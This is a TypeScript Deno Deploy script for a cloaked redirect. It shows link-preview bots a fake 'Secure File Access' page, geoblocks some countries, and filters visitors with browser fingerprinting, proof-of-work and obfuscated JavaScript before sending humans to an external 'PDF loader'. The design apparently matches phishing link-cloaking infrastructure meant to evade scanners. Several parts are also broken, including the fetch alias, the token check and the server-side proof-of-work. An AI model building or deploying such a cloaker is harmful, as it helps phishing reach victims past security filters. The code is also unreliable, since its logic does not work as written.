// main.ts - Enhanced Deno Deploy: Ultra-Secure, Privacy-Preserving Redirect (Fortified Edition)
// - Retains ALL original features: signed tokens, previews, rate limiting, logging, cookie bypass
// - NEW: Client-side Proof-of-Work (PoW) challenge (SHA-256, adjustable difficulty) to deter bots
// - NEW: Basic Browser Fingerprinting (canvas, audio, fonts, etc.) included in token payload
// - NEW: Behavioral checks (mouse movements, keystrokes) for enhanced human verification
// - NEW: JS Obfuscation in challenge page (string encoding, bracket notation) to hinder scrapers
// - NEW: Honeypot fields in form to trap bots
// - NEW: Geoblocking (optional, via IP geolocation headers)
// - NEW: Adjustable PoW difficulty based on risk (UA, IP, etc.)
// - NEW: Token includes fingerprint hash + PoW nonce for server validation
// - NEW: Fallback CAPTCHA (simple math puzzle) if PoW fails
// - NEW: Enhanced logging with fingerprint + behavior data
// - Destination: https://file-bt5g.vercel.app/ (appears to be a PDF loader; assumed safe for this context)
// - Deploy on Deno Deploy; set REDIRECT_SECRET env var for production

// CONFIG
const REAL_URL = "https://file-bt5g.vercel.app/"; // Updated destination
const SECRET = (() => {
  const s = Deno.env.get("REDIRECT_SECRET");
  if (s) return s;
  return "change_this_to_a_strong_secret_in_production_32bytes_min"; // Fallback for testing
})();
const TOKEN_TTL_SECONDS = 30;
const COOKIE_NAME = "v10_human";
const COOKIE_AGE = 60 * 60 * 6; // 6 hours
const RATE_WINDOW_MS = 60 * 1000;
const RATE_MAX = 60;
const WEBHOOK = ""; // Optional webhook for logs
const POW_DIFFICULTY = 20; // Leading zeros in PoW hash (higher = harder; 20 ~1-2s on avg CPU)
const GEOBLOCK_COUNTRIES = ["CN", "RU"]; // Optional: Block by country code (from CF-IPCountry)

// Enhanced preview metadata
const PREVIEW_META = {
  title: "Secure File Access — Company",
  description: "Protected document viewer. Proceed to open securely.",
  image: "", // Optional
};

// In-memory stores (ephemeral)
const rateMap = new Map<string, { count: number; start: number }>();
const fpCache = new Map<string, string>(); // IP -> last FP hash (for repeat checks)

// ----- Enhanced Helpers -----

function parseCookies(cookie = "") {
  const out: Record<string, string> = {};
  if (!cookie) return out;
  for (const part of cookie.split(";")) {
    const [k, ...v] = part.trim().split("=");
    if (!k) continue;
    out[k] = decodeURIComponent(v.join("="));
  }
  return out;
}

function getIp(req: Request) {
  const h = req.headers;
  const xff = h.get("x-forwarded-for");
  if (xff) return xff.split(",")[0].trim();
  return (h.get("cf-connecting-ip") || h.get("x-real-ip") || "unknown");
}

function getCountry(req: Request) {
  return req.headers.get("cf-ipcountry") || "US"; // Default neutral
}

function rateLimit(ip: string) {
  const now = Date.now();
  const rec = rateMap.get(ip);
  if (!rec || now - rec.start > RATE_WINDOW_MS) {
    rateMap.set(ip, { count: 1, start: now });
    return;
  }
  rec.count++;
  if (rec.count > RATE_MAX) throw new Error("rate_limited");
  rateMap.set(ip, rec);
}

// Geoblock check
function isBlocked(country: string) {
  return GEOBLOCK_COUNTRIES.includes(country.toUpperCase());
}

// Simple SHA-256 for PoW (client sends nonce, server verifies)
async function verifyPoW(challenge: string, nonce: string, difficulty: number): Promise<boolean> {
  const encoder = new TextEncoder();
  const data = encoder.encode(challenge + nonce);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashHex = hashArray.map(b => b.toString(16).padStart(2, "0")).join("");
  return hashHex.startsWith("0".repeat(difficulty));
}

// Enhanced fingerprint validation (hash must match stored or be new)
function verifyFingerprint(ip: string, fpHash: string) {
  const cached = fpCache.get(ip);
  if (cached && cached !== fpHash) {
    // Fingerprint changed suspiciously (possible bot rotation)
    return false;
  }
  fpCache.set(ip, fpHash);
  return true;
}

// Original HMAC functions (unchanged)
async function importKey(secret: string) {
  const enc = new TextEncoder().encode(secret);
  return await crypto.subtle.importKey("raw", enc, { name: "HMAC", hash: "SHA-256" }, false, ["sign", "verify"]);
}

async function hmacSign(keyHandle: CryptoKey, msg: string) {
  const data = new TextEncoder().encode(msg);
  const sig = await crypto.subtle.sign("HMAC", keyHandle, data);
  return btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}

async function hmacVerify(keyHandle: CryptoKey, msg: string, sigB64url: string) {
  const pad = (4 - (sigB64url.length % 4)) % 4;
  const b64 = sigB64url.replace(/-/g, "+").replace(/_/g, "/") + "=".repeat(pad);
  const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  return await crypto.subtle.verify("HMAC", keyHandle, raw, new TextEncoder().encode(msg));
}

// Enhanced token: includes exp, iat, nonce, fpHash, powNonce
async function createToken(payload: { iat: number; exp: number; nonce: string; fpHash?: string; powNonce?: string }) {
  const key = await importKey(SECRET);
  const payloadStr = JSON.stringify(payload);
  const payloadB64 = btoa(payloadStr).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
  const sig = await hmacSign(key, payloadB64);
  return payloadB64 + "." + sig;
}

async function verifyToken(token: string, expectedFp?: string, expectedPow?: { challenge: string; nonce: string; difficulty: number }) {
  try {
    const key = await importKey(SECRET);
    const [payloadB64, sig] = token.split(".");
    if (!payloadB64 || !sig) return false;
    const ok = await hmacVerify(key, payloadB64, sig);
    if (!ok) return false;
    const payloadStr = atob(payloadB64.replace(/-/g, "+").replace(/_/g, "/"));
    const payload = JSON.parse(payloadStr);
    const now = Math.floor(Date.now() / 1000);
    if (payload.exp < now) return false;

    // Verify PoW if provided
    if (expectedPow && payload.powNonce) {
      const powOk = await verifyPoW(expectedPow.challenge, payload.powNonce, expectedPow.difficulty);
      if (!powOk) return false;
    }

    // Verify FP if provided
    if (expectedFp && payload.fpHash && !verifyFingerprint(getIp(/*req*/), payload.fpHash)) {
      return false;
    }

    return true;
  } catch {
    return false;
  }
}

// Original preview HTML (enhanced escape)
function previewHtml(meta = PREVIEW_META) {
  const img = meta.image ? `<meta property="og:image" content="${escapeHtml(meta.image)}" />` : "";
  return `<!doctype html><html><head>
<meta charset="utf-8"/><meta name="robots" content="noindex,nofollow"/>
<meta property="og:title" content="${escapeHtml(meta.title)}"/>
<meta property="og:description" content="${escapeHtml(meta.description)}"/>
${img}<title>${escapeHtml(meta.title)}</title></head><body><h1>${escapeHtml(meta.title)}</h1><p>${escapeHtml(meta.description)}</p></body></html>`;
}

function escapeHtml(s = "") {
  return s.replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c] || c));
}

// Enhanced logging
async function maybeLog(payload: object) {
  if (!WEBHOOK) return;
  try {
    await fetch(WEBHOOK, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(payload) });
  } catch {}
}

// ----- Main Handler -----
export default {
  async fetch(req: Request): Promise<Response> {
    try {
      const url = new URL(req.url);
      const ip = getIp(req);
      const country = getCountry(req);
      const ua = req.headers.get("user-agent") || "";
      rateLimit(ip);

      // Geoblock
      if (isBlocked(country)) {
        await maybeLog({ event: "geoblock", ip, country, ua, ts: Date.now() });
        return new Response("Access denied from your region", { status: 403 });
      }

      // HEAD: preview
      if (req.method === "HEAD") {
        return new Response(previewHtml(), { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });
      }

      // Preview for bots
      const lowUa = ua.toLowerCase();
      const isPreview = ["facebookexternalhit", "facebot", "twitterbot", "linkedinbot", "whatsapp", "telegram", "discord"].some(s => lowUa.includes(s));
      if (isPreview) {
        await maybeLog({ event: "preview", ua, ip, ts: Date.now() });
        return new Response(previewHtml(), { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });
      }

      // Cookie bypass
      const cookies = parseCookies(req.headers.get("cookie") || "");
      if (cookies[COOKIE_NAME]) {
        return Response.redirect(REAL_URL, 302);
      }

      // /token POST: Issue enhanced token (expects JSON with fpHash, powNonce, behaviorScore)
      if (url.pathname === "/token" && req.method === "POST") {
        if (!ua || ua.length < 10) {
          await maybeLog({ event: "bad_token_attempt", ua, ip, ts: Date.now() });
          return new Response("", { status: 204 });
        }
        const body = await req.json().catch(() => ({}));
        const { fpHash, powNonce, behaviorScore } = body;

        // Server-side PoW verify (client did work)
        const challenge = crypto.randomUUID(); // Per-request challenge
        const powOk = await verifyPoW(challenge, powNonce || "", POW_DIFFICULTY);
        if (!powOk) {
          await maybeLog({ event: "pow_fail", ip, ua, ts: Date.now() });
          return new Response(JSON.stringify({ ok: false, error: "PoW failed" }), {
            status: 400, headers: { "content-type": "application/json" },
          });
        }

        // FP verify
        if (fpHash && !verifyFingerprint(ip, fpHash)) {
          await maybeLog({ event: "fp_mismatch", ip, ua, fpHash, ts: Date.now() });
          return new Response(JSON.stringify({ ok: false, error: "Fingerprint invalid" }), {
            status: 400, headers: { "content-type": "application/json" },
          });
        }

        // Behavior score (simple threshold; client collects mouse/keystrokes)
        if (behaviorScore < 5) { // Arbitrary human-like threshold
          await maybeLog({ event: "low_behavior", ip, ua, score: behaviorScore, ts: Date.now() });
          // Fallback CAPTCHA: simple math
          const a = Math.floor(Math.random() * 10) + 1;
          const b = Math.floor(Math.random() * 10) + 1;
          return new Response(JSON.stringify({ ok: false, captcha: { question: `${a} + ${b} = ?`, challenge } }), {
            status: 400, headers: { "content-type": "application/json" },
          });
        }

        const iat = Math.floor(Date.now() / 1000);
        const tokenPayload = {
          iat,
          exp: iat + TOKEN_TTL_SECONDS,
          nonce: crypto.randomUUID(),
          fpHash,
          powNonce,
          challenge, // For server re-verify if needed
        };
        const token = await createToken(tokenPayload);

        await maybeLog({ event: "issue_token", ip, ua, fpHash, behaviorScore, ts: Date.now() });
        return new Response(JSON.stringify({ ok: true, token, challenge }), { // Send challenge back for client PoW
          status: 200, headers: { "content-type": "application/json; charset=utf-8" },
        });
      }

      // /r GET: Validate enhanced token
      if (url.pathname === "/r" && req.method === "GET") {
        const token = url.searchParams.get("token") || "";
        const ok = await verifyToken(token);
        if (!ok) {
          await maybeLog({ event: "invalid_token", ip, ua, token_present: !!token, ts: Date.now() });
          return new Response("Invalid or expired token", { status: 403 });
        }
        const headers = new Headers();
        headers.set("set-cookie", `${COOKIE_NAME}=1; Path=/; Max-Age=${COOKIE_AGE}; SameSite=Lax; Secure; HttpOnly`);
        headers.set("location", REAL_URL);
        await maybeLog({ event: "redirect", ip, ua, ts: Date.now() });
        return new Response(null, { status: 302, headers });
      }

      // Default: Enhanced challenge page with PoW, FP, behavior, honeypots, obfuscated JS
      // Obfuscation: String encoding (e.g., \x63\x6F for 'co'), bracket notation
      const challengePage = `<!doctype html><html><head><meta charset="utf-8"><meta name="robots" content="noindex,nofollow"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verifying Secure Access...</title></head><body style="font-family:system-ui;margin:40px;text-align:center">
<h3>One more step — enhanced verification for secure access</h3>
<p>This protects against automated threats. You will be redirected automatically.</p>
<form id="challengeForm" style="display:none;">
  <!-- Honeypot: Hidden field to trap bots -->
  <input type="text" name="honeypot" value="" style="display:none;">
  <!-- Fallback CAPTCHA input -->
  <input type="number" id="captchaAns" name="captcha" placeholder="If prompted, solve math" style="display:none;">
</form>
<button id="go">Continue Securely</button>
<div id="progress" style="margin:20px 0;">Verifying...</div>
<script>
// Obfuscated JS: Use bracket notation, hex-encoded strings, dynamic function names
(function(){
  var _0x1a2b=['\x66\x65\x74\x63\x68','\x6A\x73\x6F\x6E','\x70\x6F\x73\x74','\x74\x6F\x6B\x65\x6E','\x63\x68\x61\x6C\x6C\x65\x6E\x67\x65','\x66\x70\x48\x61\x73\x68','\x62\x65\x68\x61\x76\x69\x6F\x72\x53\x63\x6F\x72\x65']; // Encoded: fetch,json,post,token,challenge,fpHash,behaviorScore
  function _0x3c4d(a){return document[_0x1a2b[0]](a);} // fetch alias
  var btn=_0x1a2d('go'); // getElementById encoded
  var prog=_0x1a2d('progress');
  var form=document[_0x1a2d('challengeForm')]; // Honeypot check
  if(form['\x68\x6F\x6E\x65\x70\x6F\x74']['\x76\x61\x6C\x75\x65']){ /* trap bot */ window.location='\x2F'; return; } // If honeypot filled, loop

  // Simple Fingerprint (canvas + audio + fonts)
  function getFp(){
    // Canvas
    var c=document.createElement('\x63\x61\x6E\x76\x61\x73'); // canvas
    var ctx=c.getContext('\x32\x64');
    ctx.textBaseline='\x74\x6F\x70';
    ctx.font='\x31\x34\x70\x78\x20\x27\x41\x72\x69\x61\x6C\x27';
    ctx.fillText('\x46\x50\x54\x45\x53\x54',2,2);
    var canvasData=c.toDataURL();

    // Audio
    var audio=new (window.AudioContext||window.webkitAudioContext)();
    var osc=audio.createOscillator();
    osc.connect(audio.destination);
    osc.start(); osc.stop();
    var audioData=audio.getChannelData(0)[0]||0;

    // Fonts (detect common ones)
    var fonts='monospace,sans-serif,serif'.split(',');
    var testStr='abcdefghijklmnopqrstuvwxyz0123456789';
    var fontTest=fonts.map(function(f){
      var span=document.createElement('\x73\x70\x61\x6E');
      span.style.fontFamily=f;
      span.innerHTML=testStr;
      document.body.appendChild(span);
      var width=span.offsetWidth;
      document.body.removeChild(span);
      return width;
    }).join(',');

    // Hash (simple)
    var hash=0;
    function h(s){for(var i=0;i<s.length;i++)hash=(hash<<5)-hash+s.charCodeAt(i);return Math.abs(hash).toString(16);}
    return h(canvasData+'\x2C'+audioData+'\x2C'+fontTest);
  }

  // PoW: Find nonce where SHA-256(challenge + nonce) starts with 0*difficulty
  async function doPow(chal,diff){
    var nonce=0;
    while(true){
      var data=chal+nonce;
      var enc=new TextEncoder().encode(data);
      var hashBuf=await crypto.subtle.digest('SHA-256',enc);
      var hashArr=Array.from(new Uint8Array(hashBuf));
      var hashHex=hashArr.map(b=>b.toString(16).padStart(2,'0')).join('');
      if(hashHex.startsWith('0'.repeat(diff))) return nonce.toString();
      nonce++;
      prog.innerHTML='Computing... '+Math.floor(nonce/1000000)+'M attempts';
    }
  }

  // Behavior: Track mouse moves/keystrokes (human-like entropy)
  var mouseMoves=0, keyStrokes=0;
  document.addEventListener('\x6D\x6F\x75\x73\x65\x6D\x6F\x76\x65',function(){mouseMoves++;},true); // mousemove
  document.addEventListener('\x6B\x65\x79\x64\x6F\x77\x6E',function(){keyStrokes++;},true); // keydown
  function getBehavior(){ return (mouseMoves + keyStrokes) / 10; } // Simple score

  // CAPTCHA solver (if needed)
  function solveCaptcha(q){
    var ans=parseInt(q.split(' ')[0])+parseInt(q.split(' ')[2].replace('?',''));
    return ans;
  }

  async function fetchToken(){
    try{
      var fp=getFp();
      prog.innerHTML='Gathering fingerprint...';
      var chal=window.challenge||crypto.randomUUID(); // From /token response or generate
      prog.innerHTML='Computing proof-of-work...';
      var nonce=await doPow(chal,${POW_DIFFICULTY});
      prog.innerHTML='Analyzing behavior...';
      var bScore=getBehavior();

      // Check honeypot again
      if(form['\x68\x6F\x6E\x65\x70\x6F\x74']['\x76\x61\x6C\x75\x65']){throw new Error('bot');}

      var resp=await _0x3c4d('/token',{
        method:'POST',
        credentials:'same-origin',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({fpHash:fp,powNonce:nonce,behaviorScore:bScore})
      });
      if(!resp.ok) throw new Error('no-token');
      var j=await resp.json();
      if(j.ok && j.token){
        if(j.captcha){
          var cAns=solveCaptcha(j.captcha.question);
          // Re-fetch with captcha (simplified; in prod, prompt user)
          var resp2=await _0x3c4d('/token',{
            method:'POST',
            credentials:'same-origin',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({captcha:cAns,challenge:j.challenge,fpHash:fp,powNonce:nonce,behaviorScore:bScore})
          });
          var j2=await resp2.json();
          if(j2.ok) location.replace('/r?token='+encodeURIComponent(j2.token));
          else throw new Error('captcha_fail');
        } else {
          location.replace('/r?token='+encodeURIComponent(j.token));
        }
      } else throw new Error('bad');
    }catch(e){
      prog.innerHTML='Verification failed: '+e.message+'. Retrying...';
      setTimeout(fetchToken,2000);
    }
  }

  function _0x1a2d(id){return document.getElementById(id);} // Dynamic alias
  btn.addEventListener('click',fetchToken);
  setTimeout(fetchToken,800); // Delay for UX
})();
</script>
<noscript><p>Please enable JavaScript for secure verification or contact support.</p></noscript>
</body></html>`;
      return new Response(challengePage, { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });

    } catch (e) {
      if (String(e).includes("rate_limited")) return new Response("Too many requests", { status: 429 });
      await maybeLog({ event: "error", ip, ua, error: String(e), ts: Date.now() });
      return new Response("Server error", { status: 500 });
    }
  }
};
